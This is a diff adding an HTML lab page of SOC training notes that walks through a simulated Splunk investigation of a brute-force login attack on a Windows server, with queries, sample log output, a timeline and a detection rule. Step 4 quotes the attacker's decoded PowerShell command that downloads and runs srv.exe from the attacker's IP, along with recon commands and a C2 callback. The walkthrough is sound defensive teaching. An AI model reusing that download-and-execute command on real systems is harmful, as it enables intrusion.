@@ -1,0 +1,437 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab: Brute Force — SOC Notes</title>
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+<nav class="navbar">
+  <button id="sb-toggle" class="nav-toggle" onclick="toggleSidebar()" title="Toggle sidebar" aria-label="Toggle sidebar">
+    <svg width="15" height="12" viewBox="0 0 15 12" fill="currentColor">
+      <rect width="15" height="2" rx="1"/>
+      <rect y="5" width="15" height="2" rx="1"/>
+      <rect y="10" width="15" height="2" rx="1"/>
+    </svg>
+  </button>
+  <a href="index.html" class="nav-brand"><span class="icon">⬡</span> SOC Notes</a>
+  <div class="nav-links">
+    <a href="index.html">Home</a>
+    <a href="psaa.html">PSAA</a>
+    <a href="security-onion.html">Security Onion</a>
+    <a href="splunk.html">Splunk</a>
+    <a href="log-sources.html">Log Sources</a>
+  </div>
+</nav>
+
+<div class="layout">
+  <aside id="sb" class="sidebar">
+    <div class="sidebar-header">
+      <div class="sidebar-label">Splunk</div>
+      <div class="sidebar-title">Lab: Brute Force</div>
+    </div>
+  </aside>
+
+  <main id="main" class="main">
+    <div class="content-wrap">
+      <div id="content-area">
+        <div class="welcome">
+          <div class="w-icon">🔬</div>
+          <h2>Lab: Brute Force Investigation</h2>
+          <p>Select a step from the sidebar to begin.</p>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<script>
+window.NOTEBOOK = {
+  title: 'Lab: Brute Force',
+  topics: [
+    { id: 'scenario',    badge: 'SIT', label: 'Scenario & Environment'       },
+    { id: 'step1',       badge: 'S1',  label: 'Step 1 — Discover the Attack' },
+    { id: 'step2',       badge: 'S2',  label: 'Step 2 — Identify Source IP'  },
+    { id: 'step3',       badge: 'S3',  label: 'Step 3 — Confirm Compromise'  },
+    { id: 'step4',       badge: 'S4',  label: 'Step 4 — Post-Compromise'     },
+    { id: 'step5',       badge: 'S5',  label: 'Step 5 — Timeline'            },
+    { id: 'summary',     badge: 'END', label: 'Summary & Detection Rule'     },
+  ]
+};
+</script>
+
+<template id="tpl-scenario">
+<article class="topic">
+<h1>Lab · Scenario &amp; Environment</h1>
+<hr class="divider">
+
+<div class="callout lab"><strong>Lab Walkthrough</strong> — This is a fully self-contained investigation using simulated log data. Each step includes the SPL query and realistic sample output. Work through steps 1–5 in order as if you are responding to a real alert.</div>
+
+<h2>Scenario</h2>
+<p>Your SOC received an alert at <strong>09:47 UTC on 2024-01-15</strong>: <em>"Brute Force Access Behavior Detected"</em> — an Enterprise Security correlation search fired indicating more than 50 failed logins to a Windows server from a single source IP in a 15-minute window.</p>
+
+<h2>Environment</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Asset</th><th>Value</th></tr></thead>
+  <tbody>
+    <tr><td>Alert Time</td><td>2024-01-15 09:47 UTC</td></tr>
+    <tr><td>Target Server</td><td>WIN-SRV01.corp.local (10.0.1.20)</td></tr>
+    <tr><td>Index</td><td><code>index=windows</code></td></tr>
+    <tr><td>Sourcetype</td><td><code>WinEventLog:Security</code></td></tr>
+    <tr><td>Relevant EventCodes</td><td>4625 (failed login), 4624 (success), 4688 (process), 4648 (explicit cred)</td></tr>
+    <tr><td>Additional Index</td><td><code>index=endpoint</code> — Sysmon data from same host</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Investigation Questions</h2>
+<ol>
+  <li>What external IP is performing the brute force?</li>
+  <li>Which accounts were targeted?</li>
+  <li>Did any login succeed after the failures?</li>
+  <li>If successful, what actions were taken on the compromised host?</li>
+  <li>What is the full attack timeline?</li>
+</ol>
+
+<h2>Sample Raw Log Lines (for reference)</h2>
+<pre><code><span class="cm"># EventCode=4625 (Failed login)</span>
+Jan 15 09:31:04 WIN-SRV01 MSWinEventLog 1 Security 4625 - - - - NTLM - -
+An account failed to log on.
+ Subject: Security ID: NULL SID
+ Account Information:
+  Account Name: administrator
+  Account Domain: CORP
+ Failure Information:
+  Failure Reason: Unknown user name or bad password.
+  Status: 0xC000006D
+  Sub Status: 0xC000006A
+ Network Information:
+  Workstation Name: -
+  Source Network Address: 185.220.101.34
+  Source Port: 52841
+ Logon Type: 3
+
+<span class="cm"># EventCode=4624 (Successful login)</span>
+Jan 15 09:47:22 WIN-SRV01 MSWinEventLog 1 Security 4624 - - - - NTLM - -
+An account was successfully logged on.
+ Subject: Security ID: SYSTEM
+ New Logon:
+  Security ID: CORP\svc_backup
+  Account Name: svc_backup
+  Account Domain: CORP
+ Network Information:
+  Workstation Name: -
+  Source Network Address: 185.220.101.34
+  Source Port: 53214
+  Logon Type: 3</code></pre>
+</article>
+</template>
+
+<template id="tpl-step1">
+<article class="topic">
+<h1>Step 1 · Discover the Attack</h1>
+<hr class="divider">
+
+<div class="callout"><strong>Objective:</strong> Confirm that a brute force is occurring and determine the scale. Look at failed login volume over the investigation time window.</div>
+
+<h2>Query 1A — Failed Login Trend Over Time</h2>
+<pre><code><span class="cm"># First, look at the big picture — are failures elevated?</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4625
+    host=WIN-SRV01 earliest="01/15/2024:08:00:00" latest="01/15/2024:11:00:00"
+| timechart span=15m count AS "Failed Logins"</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># _time                Failed Logins</span>
+<span class="cm"># 2024-01-15 08:00     3</span>
+<span class="cm"># 2024-01-15 08:15     7</span>
+<span class="cm"># 2024-01-15 08:30     4</span>
+<span class="cm"># 2024-01-15 08:45     6</span>
+<span class="cm"># 2024-01-15 09:00     5</span>
+<span class="cm"># 2024-01-15 09:15     4</span>
+<span class="cm"># 2024-01-15 09:30     847   ← dramatic spike — attack begins</span>
+<span class="cm"># 2024-01-15 09:45     1203  ← peak attack</span>
+<span class="cm"># 2024-01-15 10:00     6     ← attack stops (or succeeded)</span>
+<span class="cm"># 2024-01-15 10:15     4</span></code></pre>
+
+<div class="callout warn"><strong>Finding:</strong> Normal baseline is ~5 failures per 15 minutes. The 09:30–09:45 window shows 847 and 1,203 failures respectively — clear brute force attack starting at 09:30 UTC.</div>
+
+<h2>Query 1B — Total Failure Count</h2>
+<pre><code><span class="cm"># Confirm total scope of the attack</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4625
+    host=WIN-SRV01 earliest="01/15/2024:09:30:00" latest="01/15/2024:10:00:00"
+| stats count AS total_failures</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># total_failures</span>
+<span class="cm"># 2,050</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step2">
+<article class="topic">
+<h1>Step 2 · Identify Source IP</h1>
+<hr class="divider">
+
+<div class="callout"><strong>Objective:</strong> Find which IP(s) are performing the attack, and determine what usernames were targeted.</div>
+
+<h2>Query 2A — Top Source IPs by Failure Count</h2>
+<pre><code><span class="cm"># Who is doing this?</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4625
+    host=WIN-SRV01 earliest="01/15/2024:09:30:00" latest="01/15/2024:10:00:00"
+| stats count AS failures, dc(user) AS unique_users_tried by src_ip
+| sort -failures</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># src_ip          failures  unique_users_tried</span>
+<span class="cm"># 185.220.101.34  2034      47</span>
+<span class="cm"># 103.21.244.0    16        3</span></code></pre>
+
+<div class="callout warn"><strong>Finding:</strong> Primary attacker is <strong>185.220.101.34</strong> with 2,034 failures targeting 47 unique usernames. This is a credential spraying / brute force attack.</div>
+
+<h2>Query 2B — Targeted Usernames</h2>
+<pre><code><span class="cm"># What accounts did they target?</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4625
+    host=WIN-SRV01 src_ip=185.220.101.34
+    earliest="01/15/2024:09:30:00" latest="01/15/2024:10:00:00"
+| stats count AS attempts by user
+| sort -attempts</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># user              attempts</span>
+<span class="cm"># administrator     412</span>
+<span class="cm"># admin             289</span>
+<span class="cm"># svc_backup        201     ← this one matters — see Step 3</span>
+<span class="cm"># root              178</span>
+<span class="cm"># guest             89</span>
+<span class="cm"># svc_sql           67</span>
+<span class="cm"># jsmith            43</span>
+<span class="cm"># ... (41 more)</span></code></pre>
+
+<h2>Query 2C — Geo Context (Optional)</h2>
+<pre><code><span class="cm"># Where is the attacker IP located?</span>
+| makeresults
+| eval ip = "185.220.101.34"
+| iplocation ip
+<span class="cm"># OR if iplocation isn't available, check threat intel:</span>
+| inputlookup threat_intel_ips WHERE src_ip="185.220.101.34"
+
+<span class="cm"># Expected: 185.220.101.34 is a known Tor exit node</span>
+<span class="cm"># Country: Germany | ASN: AS205100 | Category: Tor Exit Node</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step3">
+<article class="topic">
+<h1>Step 3 · Confirm Compromise</h1>
+<hr class="divider">
+
+<div class="callout warn"><strong>Critical Step:</strong> Did any login succeed after the failures? A successful login from the attacker IP after a brute force is a confirmed compromise — escalate immediately.</div>
+
+<h2>Query 3A — Successful Logins from Attacker IP</h2>
+<pre><code><span class="cm"># Look for EventCode=4624 (success) from the attacker IP</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4624
+    host=WIN-SRV01 src_ip=185.220.101.34
+    earliest="01/15/2024:09:30:00" latest="01/15/2024:11:00:00"
+| table _time, host, user, src_ip, LogonType, AuthenticationPackageName
+| sort _time</code></pre>
+
+<h3>Expected Output — CONFIRMED COMPROMISE</h3>
+<pre><code><span class="cm"># _time                host        user        src_ip          LogonType  Auth</span>
+<span class="cm"># 2024-01-15 09:47:22  WIN-SRV01  svc_backup  185.220.101.34  3          NTLM</span></code></pre>
+
+<div class="callout warn"><strong>Finding:</strong> At 09:47:22 UTC, the attacker successfully authenticated as <strong>svc_backup</strong> using NTLM (network logon). This is 17 minutes after the brute force began. The service account password was cracked.</div>
+
+<h2>Query 3B — Was this Account Used Before from This IP?</h2>
+<pre><code><span class="cm"># Check if this is the first time this account logged in from this IP</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4624
+    host=WIN-SRV01 user=svc_backup src_ip=185.220.101.34
+    earliest=-30d latest="01/15/2024:09:47:00"
+| stats count</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># count</span>
+<span class="cm"># 0</span>
+<span class="cm"># Never logged in from this IP before — confirms malicious access</span></code></pre>
+
+<h2>Query 3C — Normal Logon Pattern for svc_backup</h2>
+<pre><code><span class="cm"># What's the usual behavior of this account? (30-day baseline)</span>
+index=windows sourcetype=WinEventLog:Security EventCode=4624
+    user=svc_backup earliest=-30d latest="01/15/2024:09:00:00"
+| stats count AS logins, dc(src_ip) AS unique_srcs, values(src_ip) AS known_ips by host
+| sort -logins
+
+<span class="cm"># Expected output:</span>
+<span class="cm"># host        logins  unique_srcs  known_ips</span>
+<span class="cm"># WIN-SRV01   287     1            10.0.1.100</span>
+<span class="cm"># Normally only logs in from internal backup server 10.0.1.100</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step4">
+<article class="topic">
+<h1>Step 4 · Post-Compromise Activity</h1>
+<hr class="divider">
+
+<div class="callout"><strong>Objective:</strong> Determine what the attacker did after gaining access. Look for process creation, lateral movement attempts, and persistence mechanisms starting after 09:47 UTC.</div>
+
+<h2>Query 4A — Process Execution After Compromise</h2>
+<pre><code><span class="cm"># Sysmon process creation after the successful login</span>
+index=endpoint sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational
+    EventCode=1 host=WIN-SRV01
+    earliest="01/15/2024:09:47:00" latest="01/15/2024:12:00:00"
+| table _time, user, Image, CommandLine, ParentImage
+| sort _time</code></pre>
+
+<h3>Expected Output</h3>
+<pre><code><span class="cm"># _time                user        Image                           CommandLine</span>
+<span class="cm"># 2024-01-15 09:47:31  svc_backup  C:\Windows\System32\cmd.exe     cmd.exe</span>
+<span class="cm"># 2024-01-15 09:47:34  svc_backup  C:\Windows\System32\whoami.exe  whoami /all</span>
+<span class="cm"># 2024-01-15 09:47:38  svc_backup  C:\Windows\System32\net.exe     net user</span>
+<span class="cm"># 2024-01-15 09:47:41  svc_backup  C:\Windows\System32\net.exe     net localgroup administrators</span>
+<span class="cm"># 2024-01-15 09:48:02  svc_backup  C:\Windows\System32\ipconfig.exe ipconfig /all</span>
+<span class="cm"># 2024-01-15 09:48:15  svc_backup  C:\Windows\System32\net.exe     net view /domain</span>
+<span class="cm"># 2024-01-15 09:49:03  svc_backup  C:\Windows\System32\wbem\wmic.exe wmic os get caption</span>
+<span class="cm"># 2024-01-15 09:51:22  svc_backup  C:\Windows\System32\powershell.exe powershell -nop -enc JABj...</span></code></pre>
+
+<div class="callout warn"><strong>Finding:</strong> Classic post-exploitation reconnaissance pattern — whoami, net user, net localgroup, ipconfig, net view. Followed at 09:51 by obfuscated PowerShell. Attacker is performing discovery and likely downloading a second-stage payload.</div>
+
+<h2>Query 4B — Decode the PowerShell Command</h2>
+<pre><code><span class="cm"># Extract encoded command from the CommandLine</span>
+index=endpoint EventCode=1 host=WIN-SRV01
+    CommandLine="*-enc*" earliest="01/15/2024:09:51:00"
+| rex field=CommandLine "(?i)-enc(?:odedcommand)?\s+(?&lt;b64_cmd&gt;[A-Za-z0-9+/=]+)"
+| table _time, user, b64_cmd
+
+<span class="cm"># Decode in CyberChef or PowerShell:</span>
+<span class="cm"># [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("JABj..."))</span>
+<span class="cm"># Decoded: $c = New-Object Net.WebClient; $c.DownloadFile('http://185.220.101.34/srv.exe','C:\Windows\Temp\srv.exe'); Start-Process 'C:\Windows\Temp\srv.exe'</span></code></pre>
+
+<h2>Query 4C — Downloaded File Execution</h2>
+<pre><code><span class="cm"># Was the downloaded file executed?</span>
+index=endpoint EventCode=1 host=WIN-SRV01
+    (Image="*\\Temp\\*" OR CommandLine="*\\Temp\\*")
+    earliest="01/15/2024:09:51:00" latest="01/15/2024:12:00:00"
+| table _time, user, Image, CommandLine, ParentImage
+
+<span class="cm"># Expected output:</span>
+<span class="cm"># 2024-01-15 09:52:18  svc_backup  C:\Windows\Temp\srv.exe  srv.exe  powershell.exe</span></code></pre>
+</article>
+</template>
+
+<template id="tpl-step5">
+<article class="topic">
+<h1>Step 5 · Attack Timeline</h1>
+<hr class="divider">
+
+<h2>Full Attack Timeline Query</h2>
+<pre><code><span class="cm"># Build a unified timeline across all relevant indexes</span>
+(index=windows sourcetype=WinEventLog:Security
+    (EventCode=4624 OR EventCode=4625 OR EventCode=4648)
+    host=WIN-SRV01 src_ip=185.220.101.34)
+OR
+(index=endpoint sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational
+    host=WIN-SRV01 (EventCode=1 OR EventCode=3 OR EventCode=11)
+    user=svc_backup)
+earliest="01/15/2024:09:30:00" latest="01/15/2024:11:00:00"
+| eval event_desc = case(
+    EventCode="4625", "❌ FAILED LOGIN — user=" + user + " from " + src_ip,
+    EventCode="4624", "✅ SUCCESSFUL LOGIN — user=" + user + " LogonType=" + LogonType,
+    EventCode=1, "⚙️ PROCESS — " + Image + " | " + CommandLine,
+    EventCode=3, "🌐 NETWORK CONN — " + DestinationIp + ":" + DestinationPort,
+    EventCode=11, "📄 FILE CREATED — " + TargetFilename,
+    true, "EventCode=" + EventCode
+  )
+| table _time, event_desc
+| sort _time</code></pre>
+
+<h3>Expected Timeline Output</h3>
+<pre><code><span class="cm"># _time                event_desc</span>
+<span class="cm"># 2024-01-15 09:30:01  ❌ FAILED LOGIN — user=administrator from 185.220.101.34</span>
+<span class="cm"># 2024-01-15 09:30:01  ❌ FAILED LOGIN — user=admin from 185.220.101.34</span>
+<span class="cm"># ... [2,034 more failed logins over 17 minutes] ...</span>
+<span class="cm"># 2024-01-15 09:47:22  ✅ SUCCESSFUL LOGIN — user=svc_backup LogonType=3</span>
+<span class="cm"># 2024-01-15 09:47:31  ⚙️ PROCESS — cmd.exe | cmd.exe</span>
+<span class="cm"># 2024-01-15 09:47:34  ⚙️ PROCESS — whoami.exe | whoami /all</span>
+<span class="cm"># 2024-01-15 09:47:38  ⚙️ PROCESS — net.exe | net user</span>
+<span class="cm"># 2024-01-15 09:47:41  ⚙️ PROCESS — net.exe | net localgroup administrators</span>
+<span class="cm"># 2024-01-15 09:48:02  ⚙️ PROCESS — ipconfig.exe | ipconfig /all</span>
+<span class="cm"># 2024-01-15 09:48:15  ⚙️ PROCESS — net.exe | net view /domain</span>
+<span class="cm"># 2024-01-15 09:51:22  ⚙️ PROCESS — powershell.exe | powershell -nop -enc JABj...</span>
+<span class="cm"># 2024-01-15 09:52:05  📄 FILE CREATED — C:\Windows\Temp\srv.exe</span>
+<span class="cm"># 2024-01-15 09:52:18  ⚙️ PROCESS — srv.exe | srv.exe</span>
+<span class="cm"># 2024-01-15 09:52:19  🌐 NETWORK CONN — 185.220.101.34:4444   ← C2 callback</span></code></pre>
+
+<div class="callout warn"><strong>Finding:</strong> C2 callback to attacker IP on port 4444 at 09:52:19 confirms full compromise. The attacker now has an interactive shell on WIN-SRV01 running as svc_backup.</div>
+</article>
+</template>
+
+<template id="tpl-summary">
+<article class="topic">
+<h1>End · Summary &amp; Detection Rule</h1>
+<hr class="divider">
+
+<h2>Attack Summary</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Phase</th><th>Time (UTC)</th><th>Detail</th></tr></thead>
+  <tbody>
+    <tr><td>Brute Force Start</td><td>09:30:01</td><td>185.220.101.34 begins credential spraying against WIN-SRV01</td></tr>
+    <tr><td>Peak Attack</td><td>09:30–09:47</td><td>2,050 failed logins across 47 unique account names in 17 minutes</td></tr>
+    <tr><td>Compromise</td><td>09:47:22</td><td>svc_backup account cracked — NTLM network logon succeeds</td></tr>
+    <tr><td>Reconnaissance</td><td>09:47:31–09:48</td><td>whoami, net user, net localgroup, ipconfig, net view</td></tr>
+    <tr><td>Payload Download</td><td>09:51:22</td><td>Encoded PowerShell downloads srv.exe to C:\Windows\Temp\</td></tr>
+    <tr><td>C2 Callback</td><td>09:52:19</td><td>srv.exe connects back to 185.220.101.34:4444</td></tr>
+  </tbody>
+</table>
+</div>
+
+<h2>Containment Steps</h2>
+<ul>
+  <li><strong>Immediate:</strong> Disable svc_backup account in Active Directory</li>
+  <li><strong>Immediate:</strong> Block 185.220.101.34 on perimeter firewall (all ports)</li>
+  <li><strong>Immediate:</strong> Isolate WIN-SRV01 from the network for forensic imaging</li>
+  <li><strong>Short-term:</strong> Reset all service account passwords (svc_backup, svc_sql, svc_*)</li>
+  <li><strong>Short-term:</strong> Search for srv.exe across entire environment</li>
+  <li><strong>Long-term:</strong> Require service accounts to use managed service accounts (gMSA)</li>
+  <li><strong>Long-term:</strong> Enable account lockout policy — lock after 10 failures</li>
+</ul>
+
+<h2>Detection Rule — Brute Force Then Success</h2>
+<pre><code><span class="cm"># Correlation search: Brute Force Success Indicator</span>
+<span class="cm"># Schedule: Every 5 min | Window: Last 30 min | Trigger: results > 0</span>
+
+index=windows sourcetype=WinEventLog:Security EventCode=4625 earliest=-30m
+| stats count AS failures by src_ip
+| where failures &gt; 50
+| join src_ip
+    [search index=windows sourcetype=WinEventLog:Security EventCode=4624 earliest=-30m
+     | stats count AS successes by src_ip
+     | where successes &gt; 0]
+| table src_ip, failures, successes
+
+<span class="cm"># This fires ONLY when the same IP that had many failures also had a success</span>
+<span class="cm"># → High-fidelity: actual brute force with successful compromise</span>
+<span class="cm"># Notable event fields: src → src_ip | severity → HIGH</span></code></pre>
+
+<h2>Lessons Learned</h2>
+<div class="table-wrap">
+<table>
+  <thead><tr><th>Gap</th><th>Recommendation</th></tr></thead>
+  <tbody>
+    <tr><td>No account lockout policy</td><td>Enable lockout after 10 failures for all accounts</td></tr>
+    <tr><td>Weak service account password</td><td>Enforce 20+ char random passwords for service accounts; use gMSA</td></tr>
+    <tr><td>Tor exit node not blocked</td><td>Block known Tor exit node CIDRs at perimeter firewall</td></tr>
+    <tr><td>No MFA on network logon</td><td>Require MFA for all privileged account logins</td></tr>
+    <tr><td>Alert took 17 min to fire</td><td>Tune alert to 5-minute window with lower threshold (20 failures)</td></tr>
+  </tbody>
+</table>
+</div>
+</article>
+</template>
+
+<script src="js/app.js"></script>
+</body>
+</html>
